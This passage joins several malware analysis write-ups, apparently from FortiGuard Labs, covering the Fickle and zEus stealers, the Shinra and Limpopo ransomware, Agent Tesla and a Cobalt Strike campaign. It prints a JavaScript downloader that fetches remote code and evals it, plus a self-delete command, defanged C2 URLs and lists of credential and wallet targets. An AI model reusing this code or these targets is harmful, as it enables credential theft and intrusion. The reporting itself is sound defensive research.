LastPass, BrowserPass, MYKI, Splikity, CommonKey, ZohoVault, NortonPasswordManager, AviraPasswordManager, TrezorPasswordManager, MetaMask, TronLink, BinanceChain, Coin98, iWallet, Wombat, MEWCX, NeoLine, TerraStation, Keplr, Sollet, ICONex, KHC, TezBox, Byone, OneKey, DAppPlay, BitClip, SteemKeychain, NashExtension, HyconLiteClient, ZilPay, LeafWallet, CyanoWallet, CyanoWalletPro, NaboxWallet, PolymeshWallet, NiftyWallet, LiqualityWallet, MathWallet, CoinbaseWallet, CloverWallet, Yoroi, Guarda, EQUALWallet, BitAppWallet, AuroWallet, SaturnWallet, RoninWallet, Exodus, MaiarDeFiWallet, Nami, Eternl, UniSatWallet File extension Searches files with the following extensions in %USERPROFILE% and the sub-folder. The title of data to send has a “grabg::” tag. .txt, .kdbx, .pdf, .doc, .docx, .xls, .xlsx, .ppt, .pptx, .odt, .odp, wallet.dat Partial path Concatenates %APPDATA% and the following strings and searches log files and ldb files in the Local Storage/leveldb subfolder.

Below are those targets and the way data is processed: Applications Sends files in specified folder to the server. Most often, the tag is the application name in lower case appended by two colons: Anydesk, Ubisoft (tag:uplay::), Steam, Skype, Signal, ICQ, Filezilla, Telegram, Tox, Pidgin, Element Gecko engine browser Searches %APPDATA%, %LOCALAPPDATA% or %USERPROFILE% for these files: logins.json key4.db, keydb (tag: geckologins::) and  cookies.sqlite (tag: geckocookies::) If found, it copies the file to the Temp folder, sends a copy to the server, and deletes the copy. Chromium based browser Searches “os_crypt\" and \"encrypted_key” in the Local state file to get a decryption key. It parses data in Cookies, History, WebData, and Login Data files to obtain sensitive data and sends a summarized result to the server. These files are also copied to the Temp folder before Fickle Stealer reads them. They are later deleted. The title is browser and the data is stored in JSON format. Finally, it sends a screenshot to the server and deletes itself by executing the following command: cmd.exe /c timeout /t 5 & del /f /q {stealer} && exit In addition to some popular applications, this stealer searches sensitive files in parent directories of common installation directories to ensure comprehensive data gathering. It also receives a target list from the server, which makes Fickle Stealer more flexible. Variants receiving an updated list are observed. The frequently updated attack chain also shows that it’s still in development. FortiGuard will continue monitoring malware variants and provide appropriate protections as needed.

The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Shinra and Limpopo ransomware. Affected platforms:Microsoft Windows, VMWare ESXiImpacted parties:Microsoft Windows and VMWare ESXi UsersImpact:Encrypts victims' files and demands ransom for file decryptionSeverity level:High The Shinra ransomware was first submitted to a publicly available file-scanning service in April 2024. The threat actor steals victims' data before deploying and running its ransomware malware to encrypt files. The ransomware is also designed to delete Volume Shadow Copies to inhibit system recovery. Since threat actors sometimes use the names of subcultural characters and organizations, we wondered if Shinra was borrowed from the criminal corporation in the Final Fantasy 7 game, but unfortunately, we found no such evidence. Information on the infection vector used by the Shinra ransomware threat actor is unavailable. However, it is not likely to differ significantly from other ransomware groups. The Shinra ransomware samples were submitted to a publicly available file scanning service from Israel, Poland, Russia, the United Kingdom, and the United States. One of the Shinra ransomware samples (SHA2: 31eec61ed6866e0b4b3d6b26a3a7d65fed040df61062dd468a1f5be8cc709de7) performs the following actions: The Shinra ransomware sample copies itself to the current user's startup folder in the start menu as <ID>.exe, where <ID> is 32 hex characters. It then terminates processes whose names contain any of the following strings: wxServer wxServerView Sqlmangr RAgui supervise Culture Defwatch winword QBW32 QBDBMgr qbupdate axlbridge httpd fdlauncher MsDtSrvr java 360se 360doctor wdswfsafe fdhost GDscan ZhuDongFangYu QBDBMgrN mysqld AutodeskDesktopApp acwebbrowser Creative Cloud Adobe Desktop Service CoreSync Adobe CEF Helper node AdobeIPCBroker sync-taskbar sync-worker InputPersonalization AdobeCollabSync BrCtrlCntr BrCcUxSys SimplyConnectionManager Simply.SystemTrayIcon fbguard fbserver ONENOTEM wsa_service koaly-exp-engine-se It also terminates services whose names contain any of the following strings: wrapper DefWatch ccEvtMgr ccSetMgr SavRoam Sqlservr sqlagent sqladhlp Culserver RTVscan sqlbrowser SQLADHLP QBIDPService Intuit.QuickBooks.FCS QBCFMonitorService msmdsrv tomcat6 zhudongfangyu vmware-usbarbitator64 vmware-converter dbsrv12 dbeng8 MSSQL$MICROSOFT##WID MSSQL$VEEAMSQL2012 SQLAgent$VEEAMSQL2012 SQLBrowser SQLWriter FishbowlMySQL MSSQL$MICROSOFT##WID MySQL57 MSSQL$KAV_CS_ADMIN_KIT MSSQLServerADHelper100 SQLAgent$KAV_CS_ADMIN_KIT msftesql-Exchange MSSQL$MICROSOFT##SSEE MSSQL$SBSMONITORING MS The Shinra ransomware replaces the desktop wallpaper by changing the following registry setting: The ransomware sets the following registry keys: It also uses wevtutil.exe to enumerate and clear Windows logs. The ransomware does not encrypt files with the following extensions: .exe .dll .msi .bmp .iso .shinra2 The ransomware does not encrypt files in directories containing the following strings: $Windows.~bt intel msocache $recycle.bin Windows photo viewer Windows nt msbuild internet explorer System volume information Windows.old google application data Windows defender Windows perflog Windows security Windowspowershell microsoft boot Windows journal microsoft shared common files appdata usoshared $Windows.~ws all users Windowsapp microsoft.net It avoids encrypting the following files: ntldr ntuser.dat bootsect.bak autorun.inf thumbs.db iconcache.db Oddly enough, the Shinra ransomware also includes a different list of file extensions, but we could not find any code using this list. It’s possible that the list is for future development or leftover code that wasn’t removed. The list contains the following extensions: .rar .zip .ckp .db3 .dbf .dbc .dbs .dbt .dbv .frm .mdf .mrg .mwb .myd .ndf .qry .sdb .sdf .sql .tmd .wdb .bz2 .tgz .lzo .db .7z .sqlite .accdb sqlite3 .sqlitedb .db-wal .db-shm .dacpac .1c .1cd .vmdk .vmem .iso .tar .fdb .csv .mdb .sl2 .mpd .rsd .tdb .tib The Shinra ransomware uses COM to run the following commands to delete shadow copies, making file recovery difficult: It then appends “.[ethan@[removed].info].SHINRA2” to the infected files. Other Shinra ransomware variants add different file extensions, such as \".SHINRA3,\" \".SHINRA7,\" and \".SHINRA9\" instead of \".SHINRA2.\" Also, some of the samples change the file icon of the encrypted files, as seen in this screenshot: The ransomware executes the following command to change the \"boot status policy\" settings so that Windows starts normally regardless of any boot errors: It also executes the following command, which disables the recovery and repair functions of Windows: The ransomware then restarts itself using \"runas admin\" to ensure that it is running with administrator privileges. The malware also checks to make sure it’s running inside a targeted operating system by: The ransomware silently empties the Recycle Bin without user confirmation, progress bar, or sound. Finally, it drops a ransom note, which demands victims to contact the attacker via email: In March of this year, FortiGuard Labs received an inquiry from an Asian law enforcement agency about ransomware named “Socotra” due to its impact in that region. While no sample of the Socorta ransomware has surfaced to date, we were able to trace it back to another ransomware, Limpopo, which was submitted to a publicly available file scanning service in February 2024 that targets ESXi environments. Information on the infection vector used by the Limpopo ransomware threat actor is unavailable. Given thatBushidoToken's tweetreported that this malware is affecting Latin America and Thailand, in addition to the previous inquiry about Socorta ransomware from Asia, it is not hard to imagine that they are spreading the ransomware widely in some way, such as through Trojanized software or by exploiting vulnerabilities. Based on the locations from which ransom notes likely used by the Limpopo ransomware family were submitted to the publicly available scanning service, the countries of Chile, Guatemala, Honduras, India, Italy, Mexico, Peru, Spain, Thailand, the United States, and Vietnam were potentially affected. The Limpopo ransomware is not complex. Once executed, the Limpopo ransomware encrypts files with the following extensions: .log .vmdk .vmsd .vmem .vswp .vmx2 .vmxf .vmss .vmtx .vmtm .nvram .vsb .vbm .vlb .vrb .hlog .rar .vsm .vsm .vbk .zip .iso .tgz .bco .dump .gzip .bck .bkp .tmp .vmx .ova .ovf .tar .vmd .vmsn Once files have been encrypted, a “.LIMPOPO” extension is added to the filename. Files with this extension are skipped and effectively whitelisted. It then drops the following ransom note: Hi. We have your data. If you don't cooperate it will be made public. Go to hxxps://getsession[.]org/ Downloadinstall then add [removed] mention this code LIMPOPO in your messageget in touch with us No other samples of the Limpopo ransomware were found, but we found similar ransom notes that may have been used by ransomware variants. For example, the Socorta ransomware, a potential Limpopo variant, drops the following ransom note: Go to hxxps://getsession[.]org/ Downloadinstall then add [Removed] to your contacts and send a message with this codename -- SOCOTRA Although no actual malware samples are available, other possible Limpopo ransomware variants include Akgum, Aktakyr, Bulanyk, Formosa, Hatartam, Monjukly, Sakgar, Sazanda, and Windows ransomware. While unverified, thetweetbelow claims that the Socotra ransomware exploits CVE-2024-22252 and CVE-2024-22253 (CVE-20204-22252 and CVE-20204-22253 may be a typo) that affect VMware ESXi, Workstation, and Fusion, which were patched in March 2024. English translation: In the case of cve 20204-22252, cve-20204-22253, be sure to patch it because it will destroy your Eid holiday. The Shinra and Limpopo ransomware described in this report are detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of those solutions. As a result, customers with up-to-date versions of these products installed are protected.

Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS-based Digital Risk Prevention Service backed by cybersecurity experts that provides unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3).

    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Windows UsersImpact:Collects sensitive information from a victim’s computerSeverity Level:Critical A new phishing campaign was recently captured by our FortiGuard Labs that spreads a new Agent Tesla variant targeting Spanish-speaking people. Security researchers have detected Agent Tesla campaigns from time to time for years. Agent Tesla is a well-known .Net-based Remote Access Trojan (RAT) designed to stealthily infiltrate victim’s computers and steal their sensitive information, such as their computer’s hardware information, login user information, keystrokes, email contacts, web browser cookies files, system clipboard data, screenshots, and basic information like login user name, computer name, OS information, CPU and RAM information, as well as saved credentials in widely installed software. In-depth research on this campaign shows that it also leverages multiple techniques to deliver the Agent Tesla core module, such as using known MS Office vulnerabilities, JavaScript code, PowerShell code, fileless modules, and more, to protect itself from being analyzed by security researchers. In this analysis, I will elaborate on how the campaign works to load Agent Tesla onto a victim’s computer, how it starts, what sensitive data it is able to collect, and the way it sends stolen data to the attacker. As you can see from the above screenshot, the phishing email was written in Spanish. The message translated into English reads as: Good day Attached is proof of payment made to your account according to your client's instructions. The phishing email looks like a standard SWIFT transfer notification from a large financial institution with a disguised Excel attachment (transferencia_swift_87647574684.xla) to the victim, as shown in Figure 1. As you may have noticed, the FortiClient service marked the phishing email with “[virus detected]” to warn the user about the attached Excel document. The Excel document is in OLE format with crafted embedded data that exploits theCVE-2017-0199vulnerability. It contains an embedded OLE hyperlink, which is opened automatically once the Excel document is started by the victim. The provided hyperlink in the document is “hxxp[:]//ilang[.]in/QqBbmc”, as shown in Figure 2. Once the victim opens the Excel file, it automatically downloads an RTF document, which the Word program then calls to open. Figure 3 shows the traffic and how the URL downloads the RTF document. CVE-2017-11882is an RCE (Remote Code Execution) vulnerability in Microsoft Office’s Equation Editor component (EQNED32.EXE). It can be exploited by Excel, Word, PowerPoint, and RTF documents as long as they contain crafted equation data in an OLE object. Successfully exploiting this vulnerability allows an attacker to execute arbitrary code on a victim's computer. This buffer overflow vulnerability overrides a return address in the stack of EQNED32.EXE. It can then hijack the process to jump to and execute the malicious code copied in the stack. Figure 4 shows the crafted equation data extracted from the downloaded RTF document. The data marked in red is a constant address of EQNED32.EXE that will override a return address in the stack when a buffer overflow occurs. Once the shellcode is executed, it downloads a JavaScript code from a website and executes it on the victim’s computer. In Figure 5, the shellcode was about to call an API, URLDownloadToFileW(), to download the JavaScript file from “hxxp[:]//equalizerrr[.]duckdns.org/eveningdatingforeveryone.js” to the local file “C:\\Users\\Bobs\\AppData\\Roaming\\morningdatingroses.js.” It then calls the API ShellExecuteW() to execute the JavaScript file (the Windows program WScript.exe is called to execute the JS file). Finally, it exits the process by calling the API ExitProcess(). Below is a code snippet of the JavaScript file. It is very clear that it continues to download another file from “hxxps[:]//paste[.]ee/d/yWWXG.” This JavaScript file is executed after calling the eval() function. morningdatingroses.js: var paparicos = new ActiveXObject(\"MSXML2.XMLHTTP\");var alijar = \"GXWWy/d/ee.etsap//:sptth\".split(\"\").reverse().join(\"\");paparicos.open(\"GET\", alijar, false);paparicos.send(); var vomitar = \"\";if (paparicos.status === 200) {vomitar= paparicos.responseText;} function estarostia(piguancha) {eval(piguancha);} estarostia(vomitar); When opening the URL in a web browser, it looks like normal JavaScript code, but it contains a piece of malicious code with base64-encoded PowerShell code. This code will be decoded and combined with other code (shown below) and executed inside a “powershell.exe” process, as you can see in Figure 6. The PowerShell code’s purpose includes: Please refer to Figure 7 for more information about the PowerShell code. The loader-module is a kind of fileless module that is never saved in the local folder. This makes it difficult for a researcher to notice the file unless performing a step-by-step, in-depth analysis. The first argument to the method VAI() is a reversed URL to the Agent Tesla core module, which is “hxxp[:]//equalizerrr[.]duckdns[.]org/droidbase64controlfire.txt.” The second argument is a switch. If it’s “1,” it will establish persistence on the victim’s computer by adding itself to the auto-run group in the system’s registry. In this case, it’s \"desativado,” so it won’t establish. The penultimate argument is a process name, which for this variant is “AddInProcess32.” The loader-module running in a PowerShell process downloads a file from the URL passed by the first argument and keeps it in the memory. This is the Agent Tesla core module, as shown in Figure 8. Afterward, it initiates the 'AddInProcess32' process in a suspended state by calling the API CreateProcessA() with the creation flags of 0x80000004 (CREATE_SUSPENDED). Next, the loader-module performs process hollowing on the process that it copies the Agent Tesla executable into and executes it within the “AddInProcess32.exe” process. To do this, it calls APIs, such as GetThreadContext(), VirtualAllocEx(), WriteProcessMemory(), SetThreadContext(), and ResumeThread(). Figure 9 shows the process tree outlining the complete picture, starting from the Excel document and ending with Agent Tesla running inside “AddInProcess32.exe.” This variant of Agent Tesla is a 32-bit .Net framework program is being obfuscated as a fileless module. Figure 10 shows a debugger that breaks Agent Tesla at the EntryPoint method, where the namespaces, classes, methods, and code flow are all obfuscated. A special method aims to detect whether it is running in an analysis environment. It performs the following detections: Once any of the above detections’ results are ‘true,’ it exits the process. In this section, I will review Agent Tesla’s features, such as how this variant collects credentials and email contacts from the victim’s device, the software from which it collects the data, and the basic information of the victim’s device. It steals saved credentials from some web browsers, classified as Chromium-based and Mozilla-based, because they use the same folder structure and files to save the credentials. It reads saved credentials from “Login Data” files under their browsers’ profile folder for Chromium-based browsers. Figure 11 shows that it had just obtained some “Opera Browser” (Chromium-based browser) credentials from its profile files “{browser’s profile path}\\Default\\Login Data” and “{browser’s profile path}\\Login Data.” Figure 12 shows it has just obtained credentials from a Firefox browser’s profile. This variant will steal credentials from the following web browser list. Chromium-based Web Browsers \"Orbitum,\" \"Elements Browser,\" \"Cool Novo,\" \"Sputnik,\" \"360 Browser,\" \"Uran,\" \"Iridium Browser,\" \"Liebao Browser,\" \"Vivaldi,\" \"Chromium,\" \"Sleipnir 6,\" \"Coowon,\" \"Coccoc,\" \"Amigo,\" \"Chedot,\" \"Epic Privacy,\" \"CentBrowser,\" \"Edge Chromium,\" \"Chrome,\" \"Citrio,\" \"Opera Browser,\" \"QIP Surf,\" \"Brave,\" \"Kometa,\" \"Comodo Dragon,\" \"7Star,\" \"Torch Browser,\" \"Yandex Browser.\" Mozilla-based Web Browsers \"Firefox, \"CyberFox, \"WaterFox, \"K-Meleon, \"Postbox, \"Thunderbird browser, \"IceCat, \"Flock, \"IceDragon, \"BlackHawk, \"PaleMoon,\" and \"SeaMonkey.” Other than the above web browsers, Agent Tesla continues to look for more saved credentials from a wide range of software, which I have categorized below. Other Web Browsers: \"Falkon Browser,\" \"Flock Browser,\" \"IE/Edge,\" \"QQ Browser,\" \"Safari for Windows,\" and \"UC Browser.” Email clients: \"Outlook, \"Opera Mail, \"PocoMail, \"The Bat!\", \"Becky!\", \"ClawsMail, \"FoxMail, \"IncrediMail, \"eM Client, \"Mailbird, \"Eudora,\" and \"Windows Mail App.\" FTP clients: \"CoreFTP,\" \"Flash FXP,\" \"FTPGetter,\" \"FTP Navigator,\"  \"FileZilla,\" \"SmartFTP,\" \"FtpCommander,\" \"WinSCP,\" and \"WS_FTP.\" VPN clients: \"NordVPN,\" \"TightVNC,\" \"RealVNC,\" \"UltraVNC,\" \"OpenVPN,\" and \"Private Internet Access.\" IM client: \"Discord,\" \"Pidgin,\" \"Trillian,\" \"Psi/Psi+,\" and \"Paltalk.\" Others: \"MysqlWorkbench,\" \"DynDns,\" \"Microsoft Credentials,\" \"Internet Downloader Manager,\" and \"JDownloader.” Agent Tesla can also collect the victim’s email contacts if they use Thunderbird as their email client. Inside global-messages-db.sqlite, under the Thunderbird profile folder, there is a file named global-messages-db.sqlite. It is an SQLite database that stores an index of all messages, including attachments, BCC and CC emails, folder names, and more. Agent Tesla extracts all contacts (email addresses) from such files. Based on my analysis, this variant disabled some features (some switch variables are set to “false” by default.), such as the keylogger, the screen logger, the system clipboard logger, and cookies. Refer to Figure 14 for details. Agent Tesla also collects information about the victim’s computer, such as the system date and time, login user name, computer name, public IP address, OS full name, CPU information, and RAM capacity. In the past, we captured many Agent Tesla variants that used HTTP POST and SMTP to submit their stolen data to their C2 server. This variant uses a new way to submit the data it collects from the victim’s device over the FTP protocol. The FTP server address and its credentials are plaintext strings held in some global variables. Figure 15 is a screenshot of Agent Tesla about to submit s credentials stolen from my test machine using the FTP method “STOR.” The format of the file name on the FTP is in “PW_{User name-Computer name_System Data&Time}.html”; the content is the stolen data in HTML format. The collected email contacts are in a txt file named “Contacts_Thunderbird.txt_{User name-Computer name_System Data&Time}.txt”. One example on my test machine is “Contacts_Thunderbird.txt_Bobs-BOBS-PC_2024_05_17_17_34_21.txt”. The txt file contains all the email addresses collected from Thunderbird. In this analysis, I went through the entire process of the Agent Tesla campaign targeting Spanish-speaking people. The flowchart in Figure 16 outlines this complex malicious campaign, detailing the process from the phishing email to the stolen information being submitted to an FTP server. We also examined how it uses multiple techniques to escape researcher analysis, such as exploiting two Microsoft vulnerabilities carried by Excel, RTF documents, executing JavaScript and PowerShell scripts, and encoding most downloaded files in base64. Next, we looked at how the fileless loader-module is called to download the Agent Tesla executable and run it in a process-hollowed AddInProcess.exe process. I then elaborated on how Agent Tesla detects whether it’s running in an analysis environment, like sandboxes, virtual machines, etc., or where there is AV software running, like Avast, Comodo, etc. We then looked at the functions this variant can perform on the victim’s device. It collects saved credentials from over 80 popular software applications and victim email contacts from Thunderbird profile files. Finally, you learned how this Agent Tesla variant submits the sensitive data it has harvested from the victim’s device to an FTP server using the “STOR” method. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, and AntiVirus services as follows: The downloading URLs are rated as “Malicious Websites” by the FortiGuard Web Filtering service. FortiMail recognizes the phishing email as “virus detected.” In addition, real-time anti-phishing provided by FortiSandbox embedded in Fortinet’s FortiMail, web filtering, and antivirus solutions provides advanced protection against both known and unknown phishing attempts. FortiGuard Antivirus service detects the attached Excel document, the downloaded RTF document, and the Agent Tesla executable file with the following AV signatures. MSExcel/CVE_2017_0199.DDOC!exploit MSOffice/CVE_2017_11882.B!exploit MSIL/AgentTesla.B!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. The FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious Equation data inside the Excel document.

This attack employs various evasion techniques to ensure successful payload delivery.Over the past few years, Ukraine has been a significant target due to its geopolitical situation. The history of these attacks reveals a pattern of increasing complexity and frequency, particularly during periods of geopolitical tension. For instance, in 2022,FortiGuard Labsreported a campaign using a malicious Excel document themed around the Ukrainian military to deliver a multi-stage Cobalt Strike loader. In 2023,Ukraine’s Computer Emergency Response Team (CERT-UA)disclosed that UAC-0057 was involved in an attack using a malicious XLS file containing a macro and a lure image to deploy PicassoLoader and Cobalt Strike Beacon on compromised systems. In this article, we will explore the technical details of this latest multi-stage attack. The malicious Excel document contains elements in Ukrainian designed to lure the user into enabling its macros. Once the VBA macro is enabled, the document switches to sheets related to the calculation of the “amount of budget funds allocated to military units” (translated from “обсягу бюджетних коштів, що спрямовуються до військових частин”). The primary function of the VBA macro is to deploy a DLL downloader, which is encoded in HEX. Additionally, most of the strings in the VBA code are HEX-encoded to evade basic string detection mechanisms. After dropping the DLL file “Ac83faafb23919Ae9.DLl” into “%APPDATA%\\VIBErpc\\bIn\\biN,” the macro creates a shortcut named “ACtIVePRObE” in “%APPDATA%\\Microsoft.” It then uses the “Shell” command to execute “RunDLL32.EXE shell32.dll,ShellExec_RunDLL '%APPDATA%\\Microsoft\\ACtIVePRObE.lnk', 0.” This LNK file is designed to calls regsvr32 to execute the DLL file “Ac83faafb23919Ae9.DLl.” The downloader “Ac83faafb23919Ae9.DLl.” is obfuscated with ConfuserEx. First, it examines process names for specific strings: “processhacker,” “avastui,” “aswtoolssvc,” “wsc_proxy,” “procexp,” “overseer,” and “avastsvc.” If it detects a matching process associated with an analysis tool or antivirus software, it terminates the program. Once passing the process checking, it constructs a web request to get the next stage payload from the URL “hxxps://goudieelectric[.]shop/cms/svg/6364.2809640e[.]chunk.svg.” It can only download the required file if the device is located in Ukraine. It then extracts the base64 encoded data in the section that starts with “href=” and XOR it with the hard-coded array. It then generates a random file name and saves the decoded data to the TEMP folder. It then executes the decoded file using “rundll32.exe,” followed by a sleep command to wait for the execution to finish. Once completed, it deletes the decoded file to remove any traces. The decoded data is also a .NET DLL file tasked with decrypting the file for the next stage and establishing persistence. Next, it checks if the targeted file exists. If not, it creates the file “C:\\ProgramData\\Windows\\Containers\\BaseImages\\9cb03978-56d9-4f38-8f05-d1fdf135f0ab\\Files\\Windows\\System32\\ResetEngine.dll.” It then uses the hard-coded key to decrypt the data using an RC4 algorithm and writes the data to the newly created file. It then adds the registry value “C:\\Windows\\System32\\regsvr32.exe /s C:\\ProgramData\\Windows\\Containers\\BaseImages\\9cb03978-56d9-4f38-8f05-d1fdf135f0ab\\Files\\Windows\\System32\\ResetEngine.dll” into “SOFTWARE\\Microsoft\\Widows\\CurrentVersion\\Run” for persistence and uses InvokeMethod with “Create” to execute the command in the registry. The file “ResetEngine.dll” serves as the core component for decrypting and injecting the final payload. It uses “NtDelayExecution” to evade the detection of malicious activities within sandboxes. It then iterates to inspect processes and attempts to terminate the parent process, if any, in order to implement its anti-debugging measures. After the evade detection process is complete, it decrypts the final payload with an AES algorithm. After decryption, it injects the decrypted data into itself and employs various APIs, including “GetCurrentProcessId,” “OpenProcess,” “VirtualAllocEx,” “WriteProcessMemory,” “CreateRemoteThread,” and “WaitForSingleObject” to execute the final Cobalt Strike. The configuration extraction process involves XOR-ing with 0x2E, allowing us to decipher the information hidden within. By extracting and parsing the configuration, we unveiled the Beacon’s Cobalt Strike Team Server’s (C2) URLs: “hxxps://simonandschuster[.]shop/the-zero-residual-concept/products” and “hxxps://simonandschuster[.]shop/the-zero-residual-concept/sjj-solutions.” In this sophisticated attack, the assailant employs multi-stage malware tactics to thwart detection while ensuring operational stability. By implementing location-based checks during payload downloads, the attacker aims to mask suspicious activity, potentially eluding scrutiny by analysts. Leveraging encoded strings, the VBA conceals crucial import strings, facilitating the deployment of DLL files for persistence and decrypting subsequent payloads. Furthermore, the self-deletion feature aids evasion tactics, while the DLL injector employs delaying tactics and terminates parent processes to evade sandboxing and anti-debugging mechanisms, respectively. These orchestrated maneuvers converge towards the deployment of Cobalt Strike onto targeted endpoints, particularly within the confines of Ukraine's geopolitical landscape. As Office documents provide troves of functionality, including numerous plugins and scripts, users must exercise utmost caution when handling files sourced from dubious origins. Vigilance is paramount, particularly regarding any suspicious file drops or unfamiliar startup programs within registry settings.

    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High Many game makers allow users to alter a game's appearance or behavior to increase its enjoyment and replay value. Players can often also download packages created by others. However, this is also a chance for attackers to distribute their malware. This article examines a batch stealer distributed via a crafted Minecraft source pack. The zEus stealer malware has been added to a source pack that was being shared on YouTube. The name—zEus—is from a previous variant of this malware. The variant (d9d394cc2a743c0147f7c536cbb11d6ea070f2618a12e7cc0b15816307808b8a) is also distributed via a Minecraft source pack, but it’s embedded in a WinRAR self-extract file. The self-extract file mimics a Windows screensaver file. It runs the stealer and opens the image used as a file icon. It’s an image from the Internet with the string “zEus” added. This name is also found in a profile of the Discord webhook receiving stolen data. When a victim executes the zEus stealer, it checks whether it is being analyzed. If not, it collects sensitive information and drops script files to make the attack more flexible. The zEus stealer creates folders in C:\\ProgramData to save stolen data and malicious script files. zEus checks whether it is being analyzed by comparing the computer name and currently running processes with blacklists.

It creates individual text files for each piece of information and saves them to corresponding folders. The folders for stolen information are in C: \\ProgramData\\STEALER, including the PCINFO, IPINFO, HARDWARE, BROWSERS, STEAL, LDB, and SESSION folders. This folder contains two folders: IPINFO and HARDWARE. zEus looks up the victim’s IP address and related details using the online tools My External IP, ipapi, and ip-api. The results are saved as text files in the IPINFO folder. Using the IP address, zEus queries for further information from the tools, including the internet service provider, location details such as city, longitude, and latitude, and postal code. In addition, it collects the status of whether the victim is using a proxy server and if a mobile network is being used. Next, zEus uses command-line utilities and PowerShell to collect hardware information and saves the results in the HARDWARE folder, including currently running processes, OS version, product key, hardware ID, system configuration, installed programs, and WIFI password. zEus copies files for login data and user preferences from the browsers’ profile path and stores them in corresponding folders. Below are the target browsers: Chrome, Opera, Brave, Vivaldi, Edge, Firefox From these browsers, it grabs files for login data and an encryption key for a password (if necessary). It then steals cookies, history, shortcuts, and bookmarks. This folder contains login data copied from the following software: Steam, osu!, Roblox, Growtopia, Discord The files are mostly copied from the software’s data path. In addition, zEus also searches for discord_backup_codes.txt in the Downloads folder. Discord_backup_codes.txt contains backup code that helps users log in when they lose their devices for multi-factor authentication (MFA). As a result, the zEus stealer tries to get the backup code from a default location for downloaded files. The LDB folder only stores .ldb files copied from %appdata%\\discord\\Local Storage\\leveldb. From these .ldb files, the attacker can extract Discord tokens containing account and password information and then log into the victim’s account. zEus also copies various data from the following path to the SESSION folder. Not only do these files contain credentials, but the attacker also collects information about the victim. For example, it copies the Logs folders from the parent folder of EpicGamesLauncher, which contains debug logs about EpicGamesLauncher. Additionally, it copies the parent folders of game companies like Battle.net and Electronic Art. With this knowledge, the attacker can know which games are popular with the victim and how to disguise the malware to achieve the next attack. Software Path Battle.net %appdata%\\Battle.netExclude strings: BrowserCache, Cache Electronic Arts %localappdata%\\Electronic Arts Epic Games %localappdata%\\EpicGamesLauncher\\Saved\\Config%localappdata%\\EpicGamesLauncher\\Saved\\Data%localappdata%\\EpicGamesLauncher\\Saved\\Logs Telegram %appdata%\\Telegram Desktop\\tdataExclude strings: config, dumps, tdummy, emoji, user_data, webview, *.json Minecraft %userprofile%\\.lunarclient\\settings\\game\\*.json%appdata%\\.minecraft\\*.json Proton VPN %localappdata%\\protonvpn Ubisoft %localappdata%\\Ubisoft Game Launcher zEus stealer also drops KEYWORDSEARCHER.bat and Keyword.txt to the STEALER folder. The batch file helps users search for keywords they want in a folder, and the text file is its README. After data collection, the STEALER folder is compressed into a zip file—STEALER.zip—and deleted. KEYWORDSEARCHER.bat and Keyword.txt are not used by the zEus stealer. Finally, zEus organizes the attack result and sends it with STEALER.zip attached. The result shows whether it has successfully stolen the items that should be in the STEALER folder, along with the following information: Execution date, user name, computer name, processor, anti-virus software, clipboard content, installed XBOX games, cryptocurrencies, sensitive files zEus stealer also checks whether the victim uses any of the following cryptocurrencies: Zcash, Armory, Bytecoin, Jaxx, Exodus, Ethereum, AtomicWallet, Guarda, Coinomi It also searches the Downloads folder for files whose names contain one of the following keywords: 2fa, mdp, motdepasse, mot_de_passe, login, seed, key, data, db, password, secret, account, acount, paypal, banque, metamask, wallet, code, exodus, memo, compte, token, backup, recovery These keywords are related to login mechanisms, such as 2FA (two-factor authentication), seed, and key. There are also some French keywords meaning password, bank, and account. Apart from information stealing, there are features performed by the script files that are dropped to C:\\ProgramData\\{ComputerName}: Feature FileName Kill Task Manager debugerkiller.bat Send Screenshot Screen.bat Screen Lock SYSTEMLOCK.bat, configSYSLOCK.vbs, bsod.hta Chat Box CHATBOX.bat C2 Communication RAT.bat, COMMANDS.txt, HISTORY.txt Among these files, debugerkiller.bat, Screen.bat, and RAT.bat are executed immediately, and their paths are registered under HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run to achieve persistence. To avoid suspicion, the names of Windows system files and folders are used as the value name. zEus stealer drops debugerkiller.bat and obscures its 